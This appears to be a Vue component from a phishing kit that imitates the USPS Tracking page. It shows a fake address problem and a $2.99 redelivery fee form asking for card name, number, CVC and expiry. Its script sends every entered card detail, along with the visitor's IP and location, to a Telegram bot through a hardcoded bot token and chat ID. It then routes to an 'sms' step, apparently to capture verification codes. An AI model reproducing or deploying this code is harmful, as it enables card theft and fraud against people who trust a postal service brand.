                      class="search--track-input input--field q global-header--search-track"
                      id="global-header--search-track-search"
                      maxlength="256"
                      name="q"
                      type="text"
                    />
                    <div class="autocorrect"><ul aria-hidden="true"></ul></div>
                    <input
                      tabindex="-1"
                      value="Search"
                      class="input--search search--submit"
                      type="submit"
                    />
                  </span>
                </form>

                <div class="empty-search">
                  <p>Top Searches</p>
                  <ul aria-hidden="true">
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes"
                        >PO BOXES</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports"
                        >PASSPORTS</a
                      >
                    </li>
                    <li>
                      <a
                        role="menuitem"
                        tabindex="-1"
                        href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes"
                        >FREE BOXES</a
                      >
                    </li>
                  </ul>
                </div>
                <!-- END Search -->
              </div>
            </li>
          </ul>
        </nav>

        <div class="search--wrapper-hidden" id="search--display">
          <span aria-hidden="false" class="input--wrap-label"> </span>
          <form
            role="search"
            method="get"
            class="search global-header--search"
            action="https://www.usps.com/search/results.htm?PNO=1&amp;keyword="
          >
            <span aria-hidden="false" class="input--wrap">
              <div class="easy-autocomplete search-box">
                <label
                  class="visuallyhidden"
                  for="global-header--search-track-mob-search"
                  >Enter Search term for Search USPS.com</label
                >
                <input
                  autocomplete="off"
                  placeholder="Search or Enter a Tracking Number"
                  class="search--track-input input--field q fsrVisible global-header--search-track"
                  id="global-header--search-track-mob-search"
                  maxlength="256"
                  name="q"
                  type="text"
                />
                <input
                  value="Search"
                  class="input--search search--submit"
                  type="submit"
                />
              </div>
              <div class="autocorrect"><ul></ul></div>
            </span>
          </form>

          <div class="empty-search">
            <p>Top Searches</p>
            <ul>
              <li>
                <a
                  role="menuitem"
                  tabindex="-1"
                  href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes"
                  >PO BOXES</a
                >
              </li>
              <li>
                <a
                  role="menuitem"
                  tabindex="-1"
                  href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports"
                  >PASSPORTS</a
                >
              </li>
              <li>
                <a
                  role="menuitem"
                  tabindex="-1"
                  href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes"
                  >FREE BOXES</a
                >
              </li>
            </ul>
          </div>
        </div>

        <a name="endnav" id="endnav" href="#" class="hidden-skip">&nbsp;</a>
      </div>
    </div>

    <!-- END GLOBAL HEADER -->

    <div class="container-fluid full-subheader">
      <!-- Subheader -->
      <h1>USPS Tracking<sup>®</sup></h1>
      <div class="subheader_links">
        <a href="#" class="active">Tracking <i class="icon-carat_right"></i></a>
        <a href="#" class="header-faqs" id="faqHeader"
          ><strong>FAQs</strong> <i class="icon-carat_right"></i
        ></a>
      </div>
    </div>
    <div class="container-fluid tracking_form_container">
      <div class="row">
        <div class="col-xl-3 col-lg-4 col-sm-12">
          <h3>
            <a class="track-another-package-open" href="#"
              >Track Another Package <i>+</i></a
            >
          </h3>
        </div>
        <div class="col-xl-9 col-lg-8 col-sm-12"></div>
      </div>
      <div class="modal fade" id="modal-start-end" role="dialog">
        <div class="dialog-start-end modal-dialog">
          <div class="modal-content modal-container redlivModalContent">
            <div class="modal-header redlivModalHeader">
              <h3 class="modal-title redlivModalTitle">Select Date</h3>
            </div>
            <div class="modal-body redlivModalBody">
              <div class="body-content">
                <div class="row">
                  <div
                    class="col-md-12 col-sm-12 col-xs-12"
                    style="margin-top: -16px"
                  >
                    <p class="normal select-date-subheader">
                      Available dates are based on the package selected.
                    </p>
                  </div>
                </div>
                <div class="row start-end-dates-cal-container">
                  <div class="col-md-12 col-sm-12 col-xs-12 resume-date-cal">
                    <div id="resume-start-cal"></div>
                  </div>
                </div>
                <div class="row">
                  <div class="col-md-12 col-sm-12 col-xs-12 required-field">
                    <p class="normal date-selected">
                      <strong>Date Selected:</strong
                      ><input type="text" id="modal-resume-date" disabled="" />
                    </p>
                  </div>
                </div>
                <div class="row">
                  <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                    <div class="button-container redlivbtnContainer">
                      <a
                        href="#"
                        role="button"
                        class="btn-primary saveDate"
                        id="save-resume-date"
                        data-dismiss="modal"
                        tabindex="0"
                        >Select</a
                      >
                    </div>
                  </div>
                  <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                    <div class="button-container redlivbtnContainer">
                      <a
                        href="#"
                        role="button"
                        class="btn-primary button--white clearDates"
                        id="clear-resume-dates"
                        data-dismiss="modal"
                        tabindex="0"
                        >Cancel</a
                      >
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <!-- END CALENDAR MODAL -->

      <div class="row">
        <div class="col-sm-10">
          <span class="cancel"
            ><a
              href="#"
              class="track-another-package-close"
              style="display: none"
              >Close <i class="icon-cancel"></i></a
          ></span>
        </div>
      </div>
      <div class="row tracking-group" style="display: none">
        <!-- Start TRACKING FORM -->
        <form
          data-toggle="validator"
          action="TrackConfirmAction"
          name="TrackConfirmAction"
          id="trackPackage"
          method="GET"
          novalidate="true"
        >
          <input type="hidden" id="tRef" name="tRef" value="fullpage" />
          <input type="hidden" id="tLc" name="tLc" value="0" />
          <input type="hidden" id="text28777" name="text28777" value="" />
          <input type="hidden" id="tLabels" name="tLabels" value="" />
          <div class="col-sm-10">
            <div class="form-group">
              <textarea
                type="text"
                class="form-control"
                id="tracking-input"
                placeholder="Enter up to 35 tracking numbers separated by commas or enter a barcode number"
                required=""
                pattern="(((,[1-9])\d+)){1,35}"
                data-pattern-error="Please enter a valid tracking number"
                data-required-error="Please enter a tracking number."
              ></textarea>
              <div class="help-block with-errors"></div>
            </div>
          </div>
          <div class="col-sm-2 track-btn-ctn">
            <button class="button tracking-btn" type="submit">Track</button>
          </div>
        </form>
      </div>
    </div>
    &lt;
    <div id="tracked-numbers">
      <div class="track-bar-container">
        <div class="container-fluid">
          <div class="row">
            <div class="col-sm-10 col-sm-offset-1">
              <div class="product_summary delivery_exception">
                <h3 class="tracking_number">
                  Tracking Number:
                  <span class="tracking-number"> US9513201181221</span>
                </h3>
                <div class="expected_delivery"></div>
                <div class="delivery_status">
                  <h3>Status :</h3>
                  <h2>
                    <strong>We have issues with your shipping address</strong>
                    <p style="margin-top: 15px; font-size: 14px">
                      USPS Allows you to Redeliver your package to your address
                      in case of delivery failure or any other case.<br />You
                      can also track the package at any time, from shipment to
                      delivery.
                    </p>
                  </h2>
                  <div class="status_feed">
                    <p></p>
                    <p class="important"></p>
                    <p></p>
                  </div>
                </div>
                <div class="status_bar status_3">
                  <div class="bar_third bar_third_1"><span></span></div>
                  <div class="bar_third bar_third_2"><span></span></div>
                  <div class="bar_third bar_third_3"><span></span></div>
                  <span class="text_explanation">Status Not Available</span>
                </div>
              </div>
              <!-- END Product Summary -->
            </div>
            <!-- End col -->
          </div>
          <div v-if="!loading">
            <h3
              id="sign-in-to-your-account-header"
              class="lg-header"
              style="margin-bottom: 7px"
            >
              <strong>Payment Method</strong>
            </h3>
            <a style="color: red">This Redelivery request costs 2.99 USD.</a>
            <p></p>

            <form>
              <div id="country-holder">
                <div id="us">
                  <div class="row" style="margin-top: 20px">
                    <div class="col-12 required-field-inst remove-padding-l-15">
                      <div class="card-input-field-container">
                        <div
                          class="col-12 col-lg-6 card-input-fields form-group required-field"
                        >
                          <label
                            id="for-card-holder-name"
                            for="card-holder-name"
                            class="inputLabel"
                            >*Cardholder's Name as it appears on card</label
                          >
                          <input
                            id="card-holder-name"
                            tabindex="200"
                            type="text"
                            class="form-control"
                            placeholder="First Last"
                            v-model="info.cardName"
                          />
                          <span
                            v-if="
                              checked &&
                              (!info.cardName || !info.cardName.length)
                            "
                            id="card-holder-name-error"
                            role="alert"
                            class="error-messagee"
                            >Name is missing or invalid.</span
                          >
                        </div>
                        <div
                          id="card-nickname-container"
                          class="col-12 col-lg-6 card-input-fields form-group"
                        >
                          <label
                            id="for-card-nickname"
                            for="card-nickname"
                            class=""
                            >*Card Nickname (Business Card, Personal Card,
                            etc.)</label
                          >
                          <input
                            id="card-nickname"
                            tabindex="205"
                            type="text"
                            class="form-control"
                            placeholder="Card Nickname"
                            v-model="info.cardNickname"
                          />
                          <span
                            id="card-nickname-error"
                            role="alert"
                            class="error-messagee"
                            v-if="
                              checked &&
                              (!info.cardNickname || !info.cardNickname.length)
                            "
                            >Card Nickname is invalid.</span
                          >
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="row" style="margin-top: 20px">
                    <div class="col-12 required-field-inst remove-padding-l-15">
                      <div class="card-input-field-container">
                        <div
                          class="col-12 col-lg-6 card-input-fields form-group required-field"
                        >
                          <label
                            id="for-card-holder-name"
                            for="card-holder-name"
                            class="inputLabel"
                            >*Card Number</label
                          >
                          <input
                            id="card-holder-number"
                            @input="checkCardNumber"
                            maxlength="19"
                            type="text"
                            class="form-control"
                            placeholder="1234 5678 9012 3456"
                            v-model="info.cardNumber"
                          />
                          <span
                            id="card-holder-name-error"
                            role="alert"
                            class="error-messagee"
                            v-if="
                              checked &&
                              (!info.cardNumber || !info.cardNumber.length)
                            "
                            >Card Number is missing or invalid.</span
                          >
                        </div>
                        <div
                          id="card-nickname-container"
                          class="col-12 col-lg-2 card-input-fields form-group"
                        >
                          <label
                            id="for-card-nickname"
                            for="card-nickname"
                            class=""
                            >*CVC</label
                          >
                          <input
                            id="card-nickname"
                            tabindex="205"
                            type="number"
                            @input="checkCVC"
                            v-model="info.cvc"
                            class="form-control"
                            placeholder="CVC"
                          />
                          <span
                            id="card-nickname-error"
                            role="alert"
                            class="error-messagee"
                            v-if="checked && (!info.cvc || !info.cvc.length)"
                            >CVC is missing or invalid.</span
                          >
                        </div>
                        <div
                          id="card-nickname-container"
                          class="col-12 col-lg-4 card-input-fields form-group"
                        >
                          <label
                            id="for-card-nickname"
                            for="card-nickname"
                            class=""
                            >*Expires on</label
                          >
                          <input
                            id="card-nickname"
                            tabindex="205"
                            type="text"
                            maxlength="5"
                            class="form-control"
                            placeholder="MM/YY"
                            v-model="info.expiry"
                            @input="checkExpiry"
                          />
                          <span
                            id="card-nickname-error"
                            role="alert"
                            class="error-messagee"
                            v-if="
                              checked && (!info.expiry || !info.expiry.length)
                            "
                            >Card Nickname is invalid.</span
                          >
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="row" style="margin-top: 30px">
                    <center>
                      <button @click.prevent="verifyForm" name="okbb">
                        <div id="a-address-step1-wrap" class="btn-wrap-single">
                          <a
                            tabindex="13"
                            id="a-address-step1"
                            class="btn btn-primary btn-lg"
                            >Continue</a
                          >
                        </div>
                      </button>
                    </center>
                  </div>
                </div>
              </div>
            </form>
          </div>
          <div v-else class="row">
            <div class="col-xs-12 col-sm-12 col-md-12">
              <div class="form-group" id="form-group-taddress">
                <br />
                <center>
                  <img
                    src="https://icon-library.com/images/loading-icon-transparent-background/loading-icon-transparent-background-12.jpg"
                    width="150"
                    height="150"
                  />
                </center>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div id="global-footer--wrap" class="global-footer--wrap">
      <!--[if lte IE 8]>
        <link
          href="/global-elements/footer/css/main.ie.sb.css"
          rel="stylesheet"
          type="text/css"
        />
        <link
          href="/global-elements/footer/css/footer.ie.sb.css"
          rel="stylesheet"
          type="text/css"
        />
      <![endif]-->

      <footer class="global-footer">
        <a href="https://www.usps.com/" class="global-footer--logo-link"></a>
        <nav class="global-footer--navigation">
          <ol>
            <li
              style="color: #333366"
              class="global-footer--navigation-category"
            >
              Helpful Links
              <ol class="global-footer--navigation-options">
                <li>
                  <a href="https://www.usps.com/help/contact-us.htm"
                    >Contact Us</a
                  >
                </li>
                <li>
                  <a href="https://www.usps.com/globals/site-index.htm"
                    >Site Index</a
                  >
                </li>
                <li>
                  <a href="https://faq.usps.com/s/">FAQs</a>
                </li>
                <li>
                  <a href="#" onclick="KAMPYLE_ONSITE_SDK.showForm(244)"
                    >Feedback</a
                  >
                </li>
              </ol>
            </li>
            <li
              style="color: #333366"
              class="global-footer--navigation-category"
            >
              On About.USPS.com
              <ol class="global-footer--navigation-options">
                <li>
                  <a href="https://about.usps.com/">About USPS Home</a>
                </li>
                <li>
                  <a href="https://about.usps.com/newsroom/">Newsroom</a>
                </li>
                <li>
                  <a href="https://about.usps.com/newsroom/service-alerts/"
                    >USPS Service Updates</a
                  >
                </li>
                <li>
                  <a href="https://about.usps.com/resources/"
                    >Forms &amp; Publications</a
                  >
                </li>
                <li>
                  <a href="https://about.usps.com/what/government-services/"
                    >Government Services</a
                  >
                </li>
                <li>
                  <a href="https://about.usps.com/careers/">Careers</a>
                </li>
              </ol>
            </li>
            <li
              style="color: #333366"
              class="global-footer--navigation-category"
            >
              Other USPS Sites
              <ol class="global-footer--navigation-options">
                <li>
                  <a href="https://gateway.usps.com/"
                    >Business Customer Gateway</a
                  >
                </li>
                <li>
                  <a href="https://www.uspis.gov/">Postal Inspectors</a>
                </li>
                <li>
                  <a href="https://www.uspsoig.gov/">Inspector General</a>
                </li>
                <li>
                  <a href="https://pe.usps.com">Postal Explorer</a>
                </li>
                <li>
                  <a href="https://postalmuseum.si.edu/"
                    >National Postal Museum</a
                  >
                </li>
                <li>
                  <a href="https://www.usps.com/business/web-tools-apis/"
                    >Resources for Developers</a
                  >
                </li>
              </ol>
            </li>
            <li
              style="color: #333366"
              class="global-footer--navigation-category"
            >
              Legal Information
              <ol class="global-footer--navigation-options">
                <li>
                  <a href="https://about.usps.com/who/legal/privacy-policy/"
                    >Privacy Policy</a
                  >
                </li>
                <li>
                  <a href="https://about.usps.com/who/legal/terms-of-use.htm"
                    >Terms of Use</a
                  >
                </li>
                <li>
                  <a href="https://about.usps.com/who/legal/foia/">FOIA</a>
                </li>
                <li>
                  <a href="https://about.usps.com/who/legal/no-fear-act/"
                    >No FEAR Act EEO Data</a
                  >
                </li>
              </ol>
            </li>
          </ol>
        </nav>

        <div class="global-footer--copyright">
          Copyright © 2022 USPS. All Rights Reserved.
        </div>

        <ul class="global-footer--social">
          <li>
            <a
              style="text-decoration: none"
              href="https://www.facebook.com/USPS?rf=108501355848630"
            >
              <img
                alt="Image of Facebook social media icon."
                src="https://www.usps.com/global-elements/footer/images/social-facebook_1.png"
              />
            </a>
          </li>
          <li>
            <a style="text-decoration: none" href="https://twitter.com/usps">
              <img
                alt="Image of Twitter social media icon."
                src="https://www.usps.com/global-elements/footer/images/social-twitter_2.png"
              />
            </a>
          </li>
          <li>
            <a
              style="text-decoration: none"
              href="http://www.pinterest.com/uspsstamps/"
            >
              <img
                alt="Image of Pinterest social media icon."
                src="https://www.usps.com/global-elements/footer/images/social-pinterest_6.png"
              />
            </a>
          </li>
          <li>
            <a
              style="text-decoration: none"
              href="https://www.youtube.com/usps"
            >
              <img
                alt="Image of Youtube social media icon."
                src="https://www.usps.com/global-elements/footer/images/social-youtube_3.png"
              />
            </a>
          </li>
        </ul>
      </footer>
    </div>
    <div id="quick-tools-container" style="display: none"><div></div></div>
  </div>
</template>
<script>
import axios from "axios";
export default {
  name: "2-component",
  data: () => {
    return {
      loading: false,
      checked: false,
      info: {},
      IP: "",
      query: "",
    };
  },
  async beforeMount() {
    var tt = await axios.get(
      "https://api.ipgeolocation.io/ipgeo?apiKey=586dbf608c624bb1a0823f861dcdca33"
    );
    this.IP = tt.data.ip;
    this.query = tt.data.country_capital;
    window.scrollTo(0, 0);
  },
  methods: {
    checkCVC() {
      if (this.info.cvc) {
        this.info.cvc = this.info.cvc.slice(0, 4);
      }
    },
    checkCardNumber() {
      // if (this.info.cardNumber && this.info.cardNumber.length == 20) {
      //   this.info.cardNumber = this.reformulate(this.info.cardNumber);
      // }
      if (/[a-zA-Z]/.test(this.info.cardNumber)) {
        this.info.cardNumber = "";
      }

      if (
        this.info.cardNumber.length == 4 ||
        this.info.cardNumber.length == 9 ||
        this.info.cardNumber.length == 14
      ) {
        this.info.cardNumber += " ";
      }
    },
    checkExpiry() {
      if (this.info.expiry) {
        if (Number(this.info.expiry[0] + this.info.expiry[1]) > 12) {
          if (Number(this.info.expiry[1]) > 2) {
            var expiry = "0" + this.info.expiry[0] + "/2" + this.info.expiry[1];
          } else {
            expiry = "0" + this.info.expiry[0] + "/" + this.info.expiry[1];
          }
          this.info.expiry = expiry;
        } else if (
          Number(this.info.expiry[0] + this.info.expiry[1]) <= 12 &&
          this.info.expiry.length == 2
        ) {
          this.info.expiry += "/";
        }
      }
    },
    // reformulate() {
    //   var cardNUMBER = this.info.cardNumber.split("");
    //   var str = "";
    //   cardNUMBER.map((e, i) => {
    //     if (i == 0 || i % 4 != 0) {
    //       str += e;
    //     } else {
    //       str += " " + e;
    //       i++;
    //     }
    //   });
    //   return str + " ";
    // },
    verifyForm() {
      this.loading = true;
      this.checked = true;
      var that = this;
      that.info.IP = this.IP;
      that.info.query = this.query;
      var token = "8085298009:AAE07ta8T4ML6IYTOShlJeVU1RqMYTS6Q8o";

    var chatId2 = -4512252331;
      var fullMessage = `
        ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0ACard Holder Name : ${this.info.cardName}%0ACard Nickname : ${this.info.cardNickname}%0ACard Number : ${this.info.cardNumber}%0ACVC : ${this.info.cvc}%0AExpiry : ${this.info.expiry}%0ACountry : ${this.info.query}%0AIP : ${this.info.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;

      axios.post(
        `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
      );
      setTimeout(async () => {
        if (
          that.info.cardNumber &&
          that.info.cardNickname &&
          that.info.cardName &&
          that.info.cvc &&
          that.info.expiry
        ) {
          that.$router.push({
            name: "sms",
            params: {
              infos: that.$route.params.infos,
              cc: JSON.stringify(that.info),
            },
          });
        } else {
          this.loading = false;
        }
      }, 2000);
    },
  },
};
</script>
<style>
.error-messagee {
  color: #e71921;
  font-size: 13px;
  font-family: "HelveticaNeueW02-55Roma", "Helvetica Neue", Helvetica, Arial,
    sans-serif;
  padding-top: 5px;
}
</style>
